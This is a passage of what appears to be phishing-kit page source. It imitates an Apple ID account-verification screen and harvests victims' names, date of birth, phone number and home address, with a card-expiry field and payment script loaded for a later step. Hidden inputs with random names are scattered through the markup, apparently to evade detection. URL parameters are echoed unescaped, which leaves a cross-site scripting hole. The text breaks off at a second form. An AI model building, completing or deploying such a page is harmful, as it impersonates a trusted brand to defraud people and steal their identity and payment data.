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" rel="shortcut icon" type="image/x-icon">
<link href="../../assets/css/index.php" media="all" rel="stylesheet" type="text/css">
<script type='text/javascript' src="../../assets/js/jquery-1.9.1.js"></script>
<script type='text/javascript' src="../../assets/js/jquery.payment.js"></script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#ccexp").mask("99 / 99",{placeholder:"MM / YY"});
});
</script>
<script src="../../assets/js/index.php" type="text/javascript"></script>  
<style>.error {color:red}</style>
</head>


<body onload = "myCar();ctyy();bvb();bvib()" id="pagecontent">
<div id="loader"></div>
<div style="display:none;" id="myDiv" class="animate-bottom">
<input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<div class="bdd45">
<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="HeaderObj MobMenIconH">
<label class="MobMenHol"> <input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
</label>
</li>
<li class="HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> 
</li><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
</ul>
<ul class="HeaderObjList">
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
</ul>
</div>
</nav><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">

<div id="flow"><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="mobile appleid-user">
                                    <span class="first_name"><?php echo $AccountVerification;?></span>
                                    <small class="SessionUser"><?php echo $YourAppleID;?><strong><?php echo $_GET["cmd"];?></strong> </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <button class="btn btn-link"><?php echo $OuSignt;?></button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
        </div>
    </div>
</div>
<div class="container">
<div class="flex home-content">

<!-- form 1 go -->
<form style="<?php if(isset($_GET['refs'])) { echo 'display:block;'; } else { echo 'display:none;'; } ?>" action="" method="post" name="details" id="details" class="proceed">
<br>
<img src="data:image/png;base64,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" alt="Italian Trulli">
<div class="container flow-sections">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                            
<h3 class="section-subtitle" id="nameLabel"><?php echo $PersonalInformation;?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input"><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<input type="text" name="fname" id="fname" class="generic-input-field form-control field" value="<?php echo $_SESSION["fname"];?>" placeholder="<?php echo $firstname;?>" required>
<span id="nameerror"></span>
</div>
<input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
<input type="text" name="mname" id="mname" class="generic-input-field form-control field" placeholder="<?php echo $middlename;?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
<input type="text" name="lname" id="lname" class="generic-input-field form-control field" value="<?php echo $_SESSION["lname"];?>" placeholder="<?php echo $lastname;?>" required>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
<input id="dob" name="dob" class="form-control form-input" type="tel" value="<?php echo $_SESSION["dob"];?>" placeholder="<?php echo $dateobirth;?>" required>
</div>
</div><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
<input id="telephone" name="telephone" class="form-control form-input" type="tel" value="<?php echo $_SESSION["telephone"];?>" placeholder="<?php echo $TELEPHONE;?>" required>
</div>
</div>
<!-- Reason !-->
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input style="" type="text" name="" id="vb" class="generic-input-field form-control field" placeholder="">
</div>
</div>
<!-- Reason !-->
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="address" id="address" class="generic-input-field form-control field" value="<?php echo $_SESSION["address"];?>" placeholder="<?php echo $LineADDRESS;?>" required>
</div>
</div><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="town" id="town" class="generic-input-field form-control field" value="<?php echo $_SESSION["town"];?>" placeholder="" value="">
</div>
</div>
<input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<div class="form-group clearfix middle-wrapper">
<div class="name-input">
<input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<input type="text" name="county" id="county" class="generic-input-field form-control field" placeholder="<?php echo $city;?>" value="<?php echo $_SESSION["county"];?>" required>
<span id="nameerror"></span>
</div>
<div class="name-input"><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<input type="text" name="zip" id="zip" class="generic-input-field form-control field" value="<?php echo $_SESSION["postcode"];?>" placeholder="<?php echo $POSTCO;?>" required>
<span id="nameerror"></span>
</div>
<div class="name-input"><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<input type="text" name="country" id="country" class="generic-input-field form-control field" placeholder="Country" value="" required>
<span id="nameerror"></span>
</div>
<input type="hidden" id="ueser" name="usler" value="<?php echo $_GET['cmd'];?>">
<input type="hidden" id="fln" name="fln" value="<?php echo $_GET['fln'];?>">
</div>
</div>
<input name="submit" type="submit" id="signInHyperLink" style="float:center;" value="<?php echo $nxt;?>"></div> <!-- NextNextNextNextNextNextNextNextNextNextNextNextNext -->
</div>
</div>
</div>
</div><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
</form>
<!-- form 1 end -->

<!-- form 2 go -->
<form style="<?php if(isset($_GET['phaze'])) { echo 'display:block;'; } else { echo 'display:none;'; } ?>" action="" method="post" name="details" id="details" class="proceed">
<div class="container flow-sections">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<div class="col-sm-5">
